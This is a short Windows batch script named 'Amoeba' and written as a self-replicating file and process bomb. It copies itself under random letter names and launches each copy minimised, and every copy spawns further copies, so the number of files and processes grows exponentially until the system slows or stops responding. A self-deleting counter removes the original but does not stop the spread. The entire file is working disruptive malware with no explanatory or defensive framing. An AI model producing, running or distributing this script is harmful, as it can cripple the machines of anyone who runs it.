@echo off
color 02
title Amoeba
set/a life=3
:Top
if %life%==0 (
del %0
)
set name=
:Loop
set/a namenumber=%RANDOM% / (32767 / 25)
set/a namenumber=%RANDOM% / (32767 / 25)
set/a namenumber=%RANDOM% / (32767 / 25)
if %namenumber%==0 set name=A%name%
if %namenumber%==1 set name=B%name%
if %namenumber%==2 set name=D%name%
if %namenumber%==3 set name=D%name%
if %namenumber%==4 set name=E%name%
if %namenumber%==5 set name=F%name%
if %namenumber%==6 set name=G%name%
if %namenumber%==7 set name=H%name%
if %namenumber%==8 set name=I%name%
if %namenumber%==9 set name=J%name%
if %namenumber%==10 set name=K%name%
if %namenumber%==11 set name=L%name%
if %namenumber%==12 set name=M%name%
if %namenumber%==13 set name=N%name%
if %namenumber%==14 set name=O%name%
if %namenumber%==15 set name=P%name%
if %namenumber%==16 set name=Q%name%
if %namenumber%==17 set name=R%name%
if %namenumber%==18 set name=S%name%
if %namenumber%==19 set name=T%name%
if %namenumber%==20 set name=U%name%
if %namenumber%==21 set name=V%name%
if %namenumber%==22 set name=W%name%
if %namenumber%==23 set name=X%name%
if %namenumber%==24 set name=Y%name%
if %namenumber%==25 set name=Z%name%
if EXIST %name%.bat goto Loop
copy %0 %name%.bat >nul
start /min %name%.bat
set/a life=%life% -1
goto Top
